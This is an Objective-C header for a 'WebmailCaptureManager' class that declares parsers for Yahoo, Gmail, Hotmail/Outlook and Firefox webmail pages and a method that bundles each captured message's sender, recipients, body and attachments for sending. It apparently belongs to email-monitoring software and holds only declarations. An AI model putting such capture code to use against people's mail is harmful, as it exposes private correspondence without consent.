//
//  WebmailHTMLParser.h
//  WebmailCaptureManager
//
//  Created by ophat on 2/18/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

@class WebmailChecker, WebmailNotifier;

@interface WebmailHTMLParser : NSObject {
    id mDelegate;
    SEL mSelector;
    
    NSThread *mThreadA;
    WebmailChecker *mWebmailChecker;
    WebmailNotifier *mWebmailNotifier;
    BOOL isUsingIncomingOutlook;
}

@property (nonatomic,assign) id mDelegate;
@property (nonatomic,assign) SEL mSelector;
@property (nonatomic,retain) NSThread *mThreadA;
@property (nonatomic,assign) WebmailChecker *mWebmailChecker;
@property (nonatomic,assign) WebmailNotifier *mWebmailNotifier;
@property (nonatomic,assign) BOOL isUsingIncomingOutlook;

+(instancetype) sharedWebmailHTMLParser;

+(void) Yahoo_HTMLParser:(NSString *)aMyhtml type:(NSString *)aType;
+(void) Yahoo_HTMLParser_Outgoing:(NSString *)aMyhtml type:(NSString *)aType;
+(void) Gmail_HTMLParser:(NSString *)aMyhtml;
+(void) Hotmail_HTMLParser_Outlook_Outgoing:(NSString *)aMyhtml;
+(void) Hotmail_HTMLParser_Outlook_Incoming:(NSString *)aType;
+(void) Hotmail_HTMLParser:(NSString *)aMyhtml;
+(void) Hotmail_HTMLParser_Outgoing:(NSString *)aMyhtml type:(NSString *)aType;
+(void) Gmail_HTMLParser_Outgoing:(NSString *)aMyhtml type:(NSString *)aType;
+(void) Gmail_HTMLParser_InMail_Outgoing:(NSString *)aMyhtml type:(NSString *)aType;
+(void) Firefox_HTMLParser:(NSString *)aCString withDirection:(int)aDirection from:(NSString *)aFrom;

+(void) readyToSend_subject:(NSString *) aSubject sender:(NSString *) aSender senderEmail:(NSString *) aSenderEmail senderImageUrl:(NSString *)aSenderImageUrl sentDate:(NSString *)aSentDate receiver:(NSArray *)aReceiver receiverEmail:(NSArray *)aReceiverEmail receiverImageUrl:(NSString *)aReceiverImageUrl attachment:(NSArray *)aAttachment messageBody:(NSString *)aBody mailType:(NSString *)aMail direction:(int)aDirection;

+(NSString *)roundUpSecond;

@end
